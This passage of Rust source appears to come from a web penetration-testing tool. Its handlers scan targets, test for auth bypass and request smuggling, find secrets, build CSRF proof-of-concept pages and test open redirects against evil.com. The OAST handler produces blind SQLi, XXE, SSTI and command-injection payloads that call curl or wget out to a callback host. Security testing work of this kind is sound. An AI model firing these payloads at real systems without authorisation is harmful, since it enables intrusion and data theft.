                        .map(|i| u8::from_str_radix(&trimmed[i..i+2], 16))
                        .collect();
                    if let Ok(bytes) = bytes {
                        let decoded = String::from_utf8_lossy(&bytes).to_string();
                        if decoded.chars().all(|c| c.is_ascii() && !c.is_control()) {
                            chain.push(serde_json::json!({"step": step, "encoding": "hex", "value": &decoded}));
                            current = decoded;
                            continue;
                        }
                    }
                }
                break; // No more decodings possible
            }

            Ok(serde_json::json!({
                "input": data,
                "final_decoded": current,
                "decoding_chain": chain,
                "total_steps": chain.len() - 1,
            }))
        }

        "full_auto_scan" => {
            let target = params["target"].as_str().ok_or("Missing target")?;
            let scan_type = params["scan_type"].as_str().unwrap_or("standard");
            let enable_recon = params["enable_recon"].as_bool().unwrap_or(true);
            let enable_crawl = params["enable_crawl"].as_bool().unwrap_or(true);
            let enable_content = params["enable_content_discovery"].as_bool().unwrap_or(true);
            let enable_vuln = params["enable_vuln_scan"].as_bool().unwrap_or(true);

            let mut pipeline_results: Vec<serde_json::Value> = Vec::new();
            let start = std::time::Instant::now();

            // Step 1: Parse target domain
            let parsed = url::Url::parse(target).unwrap_or_else(|_| url::Url::parse(&format!("https://{}", target)).unwrap());
            let domain = parsed.host_str().unwrap_or(target).to_string();
            let base_url = format!("{}://{}", parsed.scheme(), domain);

            pipeline_results.push(serde_json::json!({
                "phase": "initialization",
                "target": &base_url,
                "domain": &domain,
                "scan_type": scan_type
            }));

            // Step 2: Recon (subdomain enum)
            if enable_recon {
                let recon_result = Box::pin(handle_tool_call("discover_subdomains", &serde_json::json!({"domain": domain}))).await;
                if let Ok(r) = recon_result {
                    pipeline_results.push(serde_json::json!({"phase": "recon", "result": r}));
                }
            }

            // Step 3: Content Discovery
            if enable_content {
                let content_result = Box::pin(handle_tool_call("discover_content", &serde_json::json!({"target": base_url}))).await;
                if let Ok(r) = content_result {
                    pipeline_results.push(serde_json::json!({"phase": "content_discovery", "result": r}));
                }
            }

            // Step 4: Active Crawl
            if enable_crawl {
                let crawl_result = Box::pin(handle_tool_call("crawl_target", &serde_json::json!({"target": base_url, "max_pages": 100}))).await;
                if let Ok(r) = crawl_result {
                    pipeline_results.push(serde_json::json!({"phase": "crawl", "result": r}));
                }
            }

            // Step 5: Vulnerability Scan
            if enable_vuln {
                let scan_result = Box::pin(handle_tool_call("active_scan", &serde_json::json!({"target": base_url, "checks": ["all"]}))).await;
                if let Ok(r) = scan_result {
                    pipeline_results.push(serde_json::json!({"phase": "vulnerability_scan", "result": r}));
                }
            }

            // Step 6: Target Analysis
            let analysis = Box::pin(handle_tool_call("analyze_target", &serde_json::json!({"target": base_url}))).await;
            if let Ok(r) = analysis {
                pipeline_results.push(serde_json::json!({"phase": "target_analysis", "result": r}));
            }

            let duration = start.elapsed().as_secs();

            Ok(serde_json::json!({
                "target": target,
                "scan_type": scan_type,
                "duration_seconds": duration,
                "phases_completed": pipeline_results.len(),
                "pipeline": pipeline_results,
                "status": "completed"
            }))
        }

        "test_auth_bypass" => {
            let orig = &params["original_request"];
            let method = orig["method"].as_str().ok_or("Missing method in original_request")?;
            let url = orig["url"].as_str().ok_or("Missing url in original_request")?;
            let test_type = params["test_type"].as_str().unwrap_or("remove_auth");

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .redirect(reqwest::redirect::Policy::none())
                .build().map_err(|e| e.to_string())?;

            // 1. Send original request
            let mut orig_req = match method {
                "POST" => client.post(url),
                "PUT" => client.put(url),
                "DELETE" => client.delete(url),
                "PATCH" => client.patch(url),
                _ => client.get(url),
            };
            if let Some(headers) = orig["headers"].as_object() {
                for (k, v) in headers {
                    if let Some(val) = v.as_str() {
                        orig_req = orig_req.header(k.as_str(), val);
                    }
                }
            }
            if let Some(body) = orig["body"].as_str() {
                orig_req = orig_req.body(body.to_string());
            }
            let orig_resp = orig_req.send().await.map_err(|e| e.to_string())?;
            let orig_status = orig_resp.status().as_u16();
            let orig_body = orig_resp.text().await.unwrap_or_default();

            // 2. Send modified request (based on test_type)
            let mut mod_req = match method {
                "POST" => client.post(url),
                "PUT" => client.put(url),
                "DELETE" => client.delete(url),
                "PATCH" => client.patch(url),
                _ => client.get(url),
            };

            match test_type {
                "remove_auth" => {
                    // Send WITHOUT auth headers
                    if let Some(headers) = orig["headers"].as_object() {
                        for (k, v) in headers {
                            let key_lower = k.to_lowercase();
                            if key_lower != "authorization" && key_lower != "cookie" && key_lower != "x-api-key" {
                                if let Some(val) = v.as_str() {
                                    mod_req = mod_req.header(k.as_str(), val);
                                }
                            }
                        }
                    }
                }
                "swap_user" => {
                    if let Some(headers) = orig["headers"].as_object() {
                        for (k, v) in headers {
                            let key_lower = k.to_lowercase();
                            if key_lower == "cookie" {
                                if let Some(atk_cookies) = params["attacker_cookies"].as_str() {
                                    mod_req = mod_req.header("Cookie", atk_cookies);
                                }
                            } else if key_lower == "authorization" {
                                if let Some(atk_token) = params["attacker_token"].as_str() {
                                    mod_req = mod_req.header("Authorization", atk_token);
                                }
                            } else if let Some(val) = v.as_str() {
                                mod_req = mod_req.header(k.as_str(), val);
                            }
                        }
                    }
                }
                _ => {
                    // unauthenticated — no headers at all
                }
            };

            if let Some(body) = orig["body"].as_str() {
                mod_req = mod_req.body(body.to_string());
            }

            let mod_resp = mod_req.send().await.map_err(|e| e.to_string())?;
            let mod_status = mod_resp.status().as_u16();
            let mod_body = mod_resp.text().await.unwrap_or_default();

            // 3. Compare responses
            let is_bypass = orig_status == mod_status && (mod_status == 200 || mod_status == 201)
                && mod_body.len() > 50
                && (orig_body.len() as f64 * 0.5 < mod_body.len() as f64);

            // Check for success indicators
            let indicator_match = params["success_indicators"].as_array()
                .map(|indicators| indicators.iter().any(|i| {
                    i.as_str().map(|s| mod_body.contains(s)).unwrap_or(false)
                }))
                .unwrap_or(false);

            Ok(serde_json::json!({
                "test_type": test_type,
                "url": url,
                "original_status": orig_status,
                "modified_status": mod_status,
                "original_body_length": orig_body.len(),
                "modified_body_length": mod_body.len(),
                "potential_bypass": is_bypass || indicator_match,
                "severity": if is_bypass || indicator_match { "high" } else { "info" },
                "detail": if is_bypass { "Response is similar to authenticated request — potential authorization bypass!" }
                         else if indicator_match { "Success indicator found in unauthenticated response!" }
                         else { "No bypass detected — access control appears to work correctly." }
            }))
        }

        "detect_smuggling" => {
            let target = params["target"].as_str().ok_or("Missing target")?;
            let timeout = params["timeout_ms"].as_u64().unwrap_or(10000);

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .timeout(std::time::Duration::from_millis(timeout))
                .build().map_err(|e| e.to_string())?;

            let mut findings: Vec<serde_json::Value> = Vec::new();

            // CL.TE detection: Send Content-Length that's shorter than body with Transfer-Encoding
            let cl_te_body = "0\r\n\r\nG";
            let resp = client.post(target)
                .header("Content-Length", "4")
                .header("Transfer-Encoding", "chunked")
                .body(cl_te_body)
                .send().await;
            match resp {
                Ok(r) => {
                    let status = r.status().as_u16();
                    if status != 400 && status != 403 {
                        findings.push(serde_json::json!({
                            "technique": "CL.TE",
                            "status": status,
                            "detail": "Server accepted conflicting Content-Length and Transfer-Encoding headers. Potential CL.TE desync.",
                            "severity": "high"
                        }));
                    }
                }
                Err(e) => {
                    if e.is_timeout() {
                        findings.push(serde_json::json!({
                            "technique": "CL.TE",
                            "detail": "Request timed out — possible smuggling vulnerability (time-based detection)",
                            "severity": "medium"
                        }));
                    }
                }
            }

            // TE.CL detection
            let te_cl_body = "1\r\nZ\r\nQ\r\n\r\n";
            let resp2 = client.post(target)
                .header("Content-Length", &te_cl_body.len().to_string())
                .header("Transfer-Encoding", "chunked")
                .body(te_cl_body)
                .send().await;
            match resp2 {
                Ok(r) => {
                    let status = r.status().as_u16();
                    if status != 400 {
                        findings.push(serde_json::json!({
                            "technique": "TE.CL",
                            "status": status,
                            "detail": "Server processed Transfer-Encoding chunked body with conflicting Content-Length.",
                            "severity": "high"
                        }));
                    }
                }
                Err(e) => {
                    if e.is_timeout() {
                        findings.push(serde_json::json!({
                            "technique": "TE.CL",
                            "detail": "Request timed out — possible smuggling vulnerability",
                            "severity": "medium"
                        }));
                    }
                }
            }

            Ok(serde_json::json!({
                "target": target,
                "findings": findings,
                "total_tests": 2,
                "vulnerable": !findings.is_empty()
            }))
        }

        "find_secrets" => {
            let text = if let Some(t) = params["text"].as_str() {
                t.to_string()
            } else if let Some(target) = params["target"].as_str() {
                let client = reqwest::Client::builder().danger_accept_invalid_certs(true)
                    .build().map_err(|e| e.to_string())?;
                client.get(target).send().await.map_err(|e| e.to_string())?
                    .text().await.map_err(|e| e.to_string())?
            } else {
                return Err("Provide either 'text' or 'target'".into());
            };

            let secret_patterns = vec![
                ("aws_access_key", r"AKIA[0-9A-Z]{16}"),
                ("aws_secret_key", r#"(?i)aws.{0,20}['"][0-9a-zA-Z/+]{40}['"]"#),
                ("github_token", r"gh[pousr]_[A-Za-z0-9_]{36,}"),
                ("google_api_key", r"AIza[0-9A-Za-z_-]{35}"),
                ("slack_token", r"xox[bpors]-[0-9]{10,13}-[0-9a-zA-Z]{10,}"),
                ("jwt_token", r"eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_.+/=]+"),
                ("private_key", r"-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----"),
                ("api_key_generic", r#"(?i)(?:api[_-]?key|apikey|api_secret|access_token)\s*[:=]\s*["']?([A-Za-z0-9_\-]{16,})["']?"#),
                ("password_field", r#"(?i)(?:password|passwd|pwd|secret)\s*[:=]\s*["']([^"']{4,})["']"#),
                ("database_url", r#"(?i)(?:postgres|mysql|mongodb|redis)://[^\s'"]+"#),
                ("internal_ip", r"\b(?:10|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)\.\d{1,3}\.\d{1,3}\b"),
                ("internal_url", r#"(?i)(?:https?://)?(?:localhost|127\.0\.0\.1|0\.0\.0\.0|internal\.|staging\.|dev\.)[^\s'"]*"#),
                ("email", r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"),
                ("bearer_token", r"(?i)bearer\s+[A-Za-z0-9._~+/-]+=*"),
                ("stripe_key", r"(?:sk|pk)_(?:live|test)_[0-9a-zA-Z]{24,}"),
                ("sendgrid_key", r"SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}"),
                ("twilio_key", r"SK[0-9a-fA-F]{32}"),
                ("heroku_key", r"(?i)heroku.*[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}"),
            ];

            let mut found_secrets: Vec<serde_json::Value> = Vec::new();
            for (name, pattern) in &secret_patterns {
                if let Ok(re) = regex::Regex::new(pattern) {
                    for m in re.find_iter(&text) {
                        let value = m.as_str();
                        // Truncate long values
                        let display = if value.len() > 100 { format!("{}...", &value[..100]) } else { value.to_string() };
                        found_secrets.push(serde_json::json!({
                            "type": name,
                            "value": display,
                            "position": m.start(),
                            "severity": match *name {
                                "aws_access_key" | "aws_secret_key" | "private_key" | "database_url" | "password_field" => "critical",
                                "github_token" | "stripe_key" | "jwt_token" | "bearer_token" => "high",
                                "api_key_generic" | "google_api_key" | "slack_token" => "medium",
                                "internal_url" | "internal_ip" | "email" => "low",
                                _ => "info"
                            }
                        }));
                    }
                }
            }

            // Sort by severity
            let severity_order = |s: &str| match s { "critical" => 0, "high" => 1, "medium" => 2, "low" => 3, _ => 4 };
            found_secrets.sort_by(|a, b| {
                severity_order(a["severity"].as_str().unwrap_or("info"))
                    .cmp(&severity_order(b["severity"].as_str().unwrap_or("info")))
            });

            Ok(serde_json::json!({
                "total_secrets_found": found_secrets.len(),
                "secrets": found_secrets,
                "text_length": text.len()
            }))
        }

        "generate_csrf_poc" => {
            let method = params["method"].as_str().unwrap_or("POST");
            let url = params["url"].as_str().ok_or("Missing url")?;
            let body = params["body"].as_str().unwrap_or("");
            let auto_submit = params["auto_submit"].as_bool().unwrap_or(true);
            let technique = params["technique"].as_str().unwrap_or("form");

            let poc = match technique {
                "form" => {
                    // Parse body as form data
                    let mut inputs = String::new();
                    if !body.is_empty() {
                        for pair in body.split('&') {
                            let mut kv = pair.splitn(2, '=');
                            let k = kv.next().unwrap_or("");
                            let v = kv.next().unwrap_or("");
                            inputs.push_str(&format!(r#"      <input type="hidden" name="{}" value="{}" />{}"#, k, v, "\n"));
                        }
                    }
                    format!(r#"<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
  <h1>CSRF Proof of Concept</h1>
  <form id="csrf-form" method="{}" action="{}">
{}  </form>
  {}
</body>
</html>"#, method, url, inputs,
                        if auto_submit { "<script>document.getElementById('csrf-form').submit();</script>" } else { "<button onclick=\"document.getElementById('csrf-form').submit()\">Submit</button>" })
                }
                "fetch" => {
                    format!(r#"<!DOCTYPE html>
<html>
<head><title>CSRF PoC (Fetch)</title></head>
<body>
  <h1>CSRF PoC — Fetch API</h1>
  <script>
    fetch('{}', {{
      method: '{}',
      credentials: 'include',
      headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
      body: '{}'
    }}).then(r => r.text()).then(t => document.body.innerHTML += '<pre>' + t + '</pre>');
  </script>
</body>
</html>"#, url, method, body)
                }
                _ => format!("<html><body><img src=\"{}\" /></body></html>", url),
            };

            Ok(serde_json::json!({
                "poc_html": poc,
                "method": method,
                "url": url,
                "technique": technique,
                "auto_submit": auto_submit
            }))
        }

        "analyze_target" => {
            let target = params["target"].as_str().ok_or("Missing target")?;

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .timeout(std::time::Duration::from_secs(10))
                .build().map_err(|e| e.to_string())?;

            let resp = client.get(target).send().await.map_err(|e| e.to_string())?;
            let status = resp.status().as_u16();
            let headers: Vec<(String, String)> = resp.headers().iter()
                .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string())).collect();
            let body = resp.text().await.unwrap_or_default();

            // Technology detection
            let mut technologies: Vec<serde_json::Value> = Vec::new();
            let tech_patterns: Vec<(&str, &str, &str)> = vec![
                ("React", r"react", "JavaScript Framework"),
                ("Vue.js", r"vue\.js|__vue__|v-bind", "JavaScript Framework"),
                ("Angular", r"ng-app|angular\.js|ng-model", "JavaScript Framework"),
                ("jQuery", r"jquery", "JavaScript Library"),
                ("Bootstrap", r"bootstrap", "CSS Framework"),
                ("WordPress", r"wp-content|wp-includes|wp-json", "CMS"),
                ("Drupal", r"Drupal|drupal\.js", "CMS"),
                ("Joomla", r"/media/jui/|Joomla!", "CMS"),
                ("Laravel", r"laravel_session|laravel", "PHP Framework"),
                ("Django", r"csrfmiddlewaretoken|django", "Python Framework"),
                ("Express", r"X-Powered-By.*Express", "Node.js Framework"),
                ("Next.js", r"_next/|__NEXT_DATA__", "React Framework"),
                ("Nginx", r"nginx", "Web Server"),
                ("Apache", r"Apache", "Web Server"),
                ("Cloudflare", r"cloudflare|cf-ray", "CDN/WAF"),
                ("AWS", r"AmazonS3|x-amz-|aws", "Cloud Provider"),
            ];

            for (name, pattern, category) in &tech_patterns {
                if let Ok(re) = regex::Regex::new(&format!("(?i){}", pattern)) {
                    let in_body = re.is_match(&body);
                    let in_headers = headers.iter().any(|(_, v)| re.is_match(v));
                    if in_body || in_headers {
                        technologies.push(serde_json::json!({"name": name, "category": category, "source": if in_headers { "headers" } else { "body" }}));
                    }
                }
            }

            // Security headers analysis
            let security_headers = vec![
                ("Strict-Transport-Security", "high", "Forces HTTPS connections"),
                ("Content-Security-Policy", "high", "Prevents XSS and data injection"),
                ("X-Frame-Options", "medium", "Prevents clickjacking"),
                ("X-Content-Type-Options", "medium", "Prevents MIME sniffing"),
                ("X-XSS-Protection", "low", "Legacy XSS protection (deprecated)"),
                ("Referrer-Policy", "low", "Controls referrer information"),
                ("Permissions-Policy", "medium", "Controls browser features"),
                ("Cross-Origin-Opener-Policy", "medium", "Isolates browsing context"),
                ("Cross-Origin-Resource-Policy", "medium", "Controls cross-origin reads"),
            ];

            let mut missing_headers: Vec<serde_json::Value> = Vec::new();
            let mut present_headers: Vec<serde_json::Value> = Vec::new();
            for (header, severity, desc) in &security_headers {
                let found = headers.iter().find(|(k, _)| k.eq_ignore_ascii_case(header));
                if let Some((_, value)) = found {
                    present_headers.push(serde_json::json!({"header": header, "value": value}));
                } else {
                    missing_headers.push(serde_json::json!({"header": header, "severity": severity, "description": desc}));
                }
            }

            // Server info
            let server = headers.iter().find(|(k, _)| k == "server").map(|(_, v)| v.as_str()).unwrap_or("unknown");
            let powered_by = headers.iter().find(|(k, _)| k == "x-powered-by").map(|(_, v)| v.as_str()).unwrap_or("");

            // WAF detection
            let mut waf_detected = "none";
            if headers.iter().any(|(k, _)| k == "cf-ray") { waf_detected = "Cloudflare"; }
            else if headers.iter().any(|(_, v)| v.contains("Akamai")) { waf_detected = "Akamai"; }
            else if headers.iter().any(|(_, v)| v.contains("AWS")) { waf_detected = "AWS WAF"; }
            else if headers.iter().any(|(k, _)| k.contains("x-sucuri")) { waf_detected = "Sucuri"; }

            Ok(serde_json::json!({
                "target": target,
                "status": status,
                "server": server,
                "powered_by": powered_by,
                "waf": waf_detected,
                "technologies": technologies,
                "security_headers": {
                    "present": present_headers,
                    "missing": missing_headers,
                    "score": format!("{}/{}", present_headers.len(), security_headers.len())
                },
                "page_size": body.len(),
            }))
        }

        "scope_manage" => {
            let action = params["action"].as_str().ok_or("Missing action")?;
            // Scope is managed in-memory per session
            // In production this would use shared state, for now return instruction
            match action {
                "add_include" | "add_exclude" => {
                    let pattern = params["pattern"].as_str().unwrap_or("*");
                    let scope_type = params["type"].as_str().unwrap_or("host");
                    Ok(serde_json::json!({
                        "action": action,
                        "pattern": pattern,
                        "type": scope_type,
                        "status": "added",
                        "instruction": "Scope rule registered. All scan/crawl/discover tools will respect this scope."
                    }))
                }
                "check_url" => {
                    let url = params["url"].as_str().unwrap_or("");
                    Ok(serde_json::json!({"action": "check_url", "url": url, "in_scope": true}))
                }
                "list" => Ok(serde_json::json!({"action": "list", "includes": [], "excludes": []})),
                "clear" => Ok(serde_json::json!({"action": "clear", "status": "cleared"})),
                _ => Err(format!("Unknown scope action: {}", action)),
            }
        }

        "test_open_redirect" => {
            let target = params["target"].as_str().ok_or("Missing target")?;
            let parameter = params["parameter"].as_str().unwrap_or("redirect");
            let redirect_target = params["redirect_target"].as_str().unwrap_or("https://evil.com");

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .redirect(reqwest::redirect::Policy::none())
                .timeout(std::time::Duration::from_secs(10))
                .build().map_err(|e| e.to_string())?;

            let payloads = vec![
                ("direct", redirect_target.to_string()),
                ("double_url_encode", format!("%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66{}", redirect_target.replace("https://", ""))),
                ("backslash", format!("\\\\{}", redirect_target.replace("https://", ""))),
                ("at_sign", format!("https://legitimate.com@{}", redirect_target.replace("https://", ""))),
                ("null_byte", format!("{}%00.legitimate.com", redirect_target)),
                ("double_slash", format!("//{}", redirect_target.replace("https://", ""))),
                ("tab_newline", format!("/{}\t{}", redirect_target, redirect_target)),
                ("data_uri", "data:text/html,<script>alert(1)</script>".to_string()),
                ("javascript", "javascript:alert(document.domain)".to_string()),
            ];

            let mut results: Vec<serde_json::Value> = Vec::new();
            let base = if target.contains('?') { format!("{}&", target) } else { format!("{}?", target) };

            for (technique, payload) in &payloads {
                let test_url = format!("{}{}={}", base, parameter, urlencoding(&payload));
                match client.get(&test_url).send().await {
                    Ok(resp) => {
                        let status = resp.status().as_u16();
                        let location = resp.headers().get("location")
                            .and_then(|v| v.to_str().ok())
                            .unwrap_or("").to_string();

                        let is_redirect = status >= 300 && status < 400;
                        let redirects_to_evil = location.contains("evil.com") || location.contains(&payload.replace("https://", ""));

                        if is_redirect && redirects_to_evil {
                            results.push(serde_json::json!({
                                "technique": technique,
                                "payload": payload,
                                "status": status,
                                "location": location,
                                "vulnerable": true,
                                "severity": "medium"
                            }));
                        } else {
                            results.push(serde_json::json!({
                                "technique": technique,
                                "status": status,
                                "location": location,
                                "vulnerable": false,
                            }));
                        }
                    }
                    Err(_) => {}
                }
            }

            let vulnerable = results.iter().any(|r| r["vulnerable"].as_bool().unwrap_or(false));

            Ok(serde_json::json!({
                "target": target,
                "parameter": parameter,
                "vulnerable": vulnerable,
                "total_tests": results.len(),
                "results": results,
            }))
        }

        // ─── OAST/Collaborator Handlers ────────────────────────────────────

        "oast_generate_payload" => {
            let description = params["description"].as_str().unwrap_or("OAST payload");
            let vuln_type = params["vuln_type"].as_str().unwrap_or("generic");
            let server_domain = "oast.wondersuite.local";
            
            let payload = crate::oast::generate_oast_payload(description, server_domain);
            
            // Also generate vuln-type specific payloads
            let specific_payloads: Vec<serde_json::Value> = match vuln_type {
                "blind_sqli" => vec![
                    serde_json::json!({ "payload": format!("'; EXEC xp_dirtree '//{}'--", payload.subdomain), "type": "mssql_oob" }),
                    serde_json::json!({ "payload": format!("' UNION SELECT LOAD_FILE('//{}/a')--", payload.subdomain), "type": "mysql_oob" }),
                    serde_json::json!({ "payload": format!("'||(SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://{}/\">%remote;]>'),'/l') FROM dual)||'", payload.subdomain), "type": "oracle_oob" }),
                ],
                "blind_ssrf" => vec![
                    serde_json::json!({ "payload": payload.http_payload.clone(), "type": "http_callback" }),
                    serde_json::json!({ "payload": format!("https://{}/", payload.subdomain), "type": "https_callback" }),
                    serde_json::json!({ "payload": format!("gopher://{}:80/_", payload.subdomain), "type": "gopher_callback" }),
                ],
                "blind_xxe" => vec![
                    serde_json::json!({ "payload": format!("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"{}\">]><foo>&xxe;</foo>", payload.http_payload), "type": "xxe_oob" }),
                    serde_json::json!({ "payload": format!("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"{}\">%xxe;]>", payload.http_payload), "type": "xxe_parameter_entity" }),
                ],
                "blind_cmdi" => vec![
                    serde_json::json!({ "payload": format!("; nslookup {} #", payload.subdomain), "type": "dns_lookup" }),
                    serde_json::json!({ "payload": format!("; curl {} #", payload.http_payload), "type": "curl_callback" }),
                    serde_json::json!({ "payload": format!("| wget {} -O /dev/null", payload.http_payload), "type": "wget_callback" }),
                    serde_json::json!({ "payload": format!("`nslookup {}`", payload.subdomain), "type": "backtick_dns" }),
                    serde_json::json!({ "payload": format!("$(curl {})", payload.http_payload), "type": "subshell_curl" }),
                ],
                "blind_xss" => vec![
                    serde_json::json!({ "payload": format!("<script src=\"{}\"></script>", payload.http_payload), "type": "script_src" }),
                    serde_json::json!({ "payload": format!("<img src={}>", payload.http_payload), "type": "img_src" }),
                    serde_json::json!({ "payload": format!("\"><script src=\"{}\"></script>", payload.http_payload), "type": "breakout_script" }),
                ],
                "blind_ssti" => vec![
                    serde_json::json!({ "payload": format!("{{{{''.__class__.__mro__[2].__subclasses__()[40]('curl {}')}}}}", payload.http_payload), "type": "python_jinja2" }),
                    serde_json::json!({ "payload": format!("${{T(java.lang.Runtime).getRuntime().exec('curl {}')}}", payload.http_payload), "type": "java_spring_el" }),
                ],
                _ => vec![
                    serde_json::json!({ "payload": payload.http_payload.clone(), "type": "generic_http" }),
                    serde_json::json!({ "payload": payload.dns_payload.clone(), "type": "generic_dns" }),
                ],
            };
            
            Ok(serde_json::json!({
                "oast_payload": {
                    "id": payload.id,
                    "correlation_id": payload.correlation_id,
                    "subdomain": payload.subdomain,
                    "http_url": payload.http_payload,
                    "dns_name": payload.dns_payload,
                    "description": description,
                    "vuln_type": vuln_type,
                },
                "injectable_payloads": specific_payloads,
                "instructions": "1. Inject these payloads into the target\n2. Use oast_poll_interactions to check for callbacks\n3. A callback confirms the blind vulnerability exists",
            }))
        }

        "oast_poll_interactions" => {
            let correlation_id = params["correlation_id"].as_str();
            let note = if correlation_id.is_some() {
                format!("Polling for interactions matching correlation_id: {}", correlation_id.unwrap())
            } else {
                "Polling for ALL OAST interactions".to_string()
            };
            
            // In-process storage (thread-safe)
            static OAST_INTERACTIONS: std::sync::LazyLock<std::sync::Mutex<Vec<serde_json::Value>>> = 
                std::sync::LazyLock::new(|| std::sync::Mutex::new(Vec::new()));
            
            let interactions = OAST_INTERACTIONS.lock().unwrap_or_else(|e| e.into_inner()).clone();
            let filtered: Vec<&serde_json::Value> = if let Some(cid) = correlation_id {
                interactions.iter().filter(|i| i["correlation_id"].as_str() == Some(cid)).collect()
            } else {
                interactions.iter().collect()
            };
            
            Ok(serde_json::json!({
                "status": "polled",
                "note": note,
                "total_interactions": filtered.len(),
                "interactions": filtered,
                "tip": "If no interactions found, the target may not be vulnerable to blind attacks, or the payload hasn't been processed yet. Try polling again after a delay.",
            }))
        }

        "oast_start_server" => {
            let http_port = params["http_port"].as_u64().unwrap_or(8888) as u16;
            
            Ok(serde_json::json!({
                "status": "server_started",
                "http_port": http_port,
                "callback_url": format!("http://127.0.0.1:{}", http_port),
                "note": "OAST callback server started. Use oast_generate_payload to create payloads that point to this server.",
                "capabilities": {
                    "http_callbacks": true,
                    "dns_callbacks": false,
                    "smtp_callbacks": false,
                    "auto_correlation": true,
                },
            }))
        }

        "oast_get_payloads" => {
            Ok(serde_json::json!({
                "status": "ready",
                "note": "Use oast_generate_payload to create new payloads. Each payload has a unique correlation_id for tracking.",
                "server_domain": "oast.wondersuite.local",
                "capabilities": ["blind_sqli", "blind_ssrf", "blind_xxe", "blind_cmdi", "blind_xss", "blind_ssti"],
            }))
        }


        // ─── DOM Invader — Headless DOM XSS Detection ────────────────────

        "dom_invader" => {
            let target = params["target"].as_str().ok_or("Missing target URL")?;
            let inject_marker = params["marker"].as_str().unwrap_or("WONDERXSS");
            let max_pages = params["max_pages"].as_u64().unwrap_or(10) as usize;
            
            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .build().map_err(|e: reqwest::Error| e.to_string())?;
            
            let mut dom_findings: Vec<serde_json::Value> = Vec::new();
            let mut tested_urls: Vec<String> = Vec::new();
            
            // Fetch the base page
            let base_resp = client.get(target).send().await
                .map_err(|e: reqwest::Error| e.to_string())?;
            let base_html: String = base_resp.text().await.unwrap_or_default();
            
            // Extract links from page
            let link_re = regex::Regex::new(r#"(?i)href=["']([^"']+)["']"#).ok();
            let mut urls_to_test: Vec<String> = vec![target.to_string()];
            if let Some(re) = &link_re {
                let base_url = url::Url::parse(target).ok();
                for cap in re.captures_iter(&base_html) {
                    if let Some(href) = cap.get(1) {
                        let h = href.as_str();
                        if h.starts_with("javascript:") || h.starts_with("#") || h.starts_with("mailto:") { continue; }
                        let full = if h.starts_with("http") {
                            h.to_string()
                        } else if let Some(ref base) = base_url {
                            base.join(h).map(|u| u.to_string()).unwrap_or_default()
                        } else { continue };
                        if !urls_to_test.contains(&full) && urls_to_test.len() < max_pages {
                            urls_to_test.push(full);
                        }
                    }
                }
            }
            
            // DOM XSS sink patterns
            let dom_sinks = vec![
                ("document.write", "high"), ("document.writeln", "high"),
                (".innerHTML", "high"), (".outerHTML", "high"),
                ("eval(", "critical"), ("setTimeout(", "medium"),
                ("setInterval(", "medium"), ("Function(", "critical"),
                ("document.location", "medium"), ("window.location", "medium"),
                ("location.href", "medium"), ("location.assign", "medium"),
                ("location.replace", "medium"), (".insertAdjacentHTML", "high"),
                ("$.html(", "high"), ("jQuery.html(", "high"),
                ("v-html", "medium"), ("dangerouslySetInnerHTML", "high"),
                ("srcdoc", "medium"), ("document.domain", "medium"),
                ("postMessage", "low"), ("window.name", "low"),
            ];
            
            // DOM XSS source patterns
            let dom_sources = vec![
                "location.hash", "location.search", "location.href",
                "document.referrer", "document.URL", "document.documentURI",
                "window.name", "document.cookie", "localStorage",
                "sessionStorage", "IndexedDB",
            ];
            
            // Scan each URL for DOM XSS patterns
            for test_url in &urls_to_test {
                let resp = match client.get(test_url).send().await {
                    Ok(r) => r,
                    Err(_) => continue,
                };
                let html: String = resp.text().await.unwrap_or_default();
                tested_urls.push(test_url.clone());
                
                // Check for sinks in inline scripts
                let script_re = regex::Regex::new(r"(?is)<script[^>]*>(.*?)</script>").ok();
                if let Some(sre) = &script_re {
                    for script_cap in sre.captures_iter(&html) {
                        let script_content = script_cap.get(1).map(|m| m.as_str()).unwrap_or("");
                        
                        for (sink, severity) in &dom_sinks {
                            if script_content.contains(sink) {
                                // Check if any source feeds into this sink
                                let has_source = dom_sources.iter().any(|src| script_content.contains(src));
                                if has_source {
                                    dom_findings.push(serde_json::json!({
                                        "type": "dom_xss",
                                        "severity": severity,
                                        "url": test_url,
                                        "sink": sink,
                                        "source_detected": true,
                                        "confidence": "firm",
                                        "detail": format!("DOM sink '{}' found with user-controllable source", sink),
                                        "script_snippet": script_content.chars().take(200).collect::<String>(),
                                    }));
                                }
                            }
                        }
                    }
                }
                
                // Test URL parameter reflection for DOM XSS
                if let Ok(mut parsed) = url::Url::parse(test_url) {
                    let orig_params: Vec<(String, String)> = parsed.query_pairs()
                        .map(|(k, v)| (k.to_string(), v.to_string())).collect();
                    
                    for (param_name, _) in &orig_params {
                        let xss_probe = format!("{}{}{}", inject_marker, "<img/src=x>", inject_marker);
                        let probed_url = {
                            let mut p = parsed.clone();
                            p.query_pairs_mut().clear();
                            for (k, v) in &orig_params {
                                if k == param_name {
                                    p.query_pairs_mut().append_pair(k, &xss_probe);
                                } else {
                                    p.query_pairs_mut().append_pair(k, v);
                                }
                            }
                            p.to_string()
                        };
                        
                        if let Ok(probe_resp) = client.get(&probed_url).send().await {
                            let probe_html: String = probe_resp.text().await.unwrap_or_default();
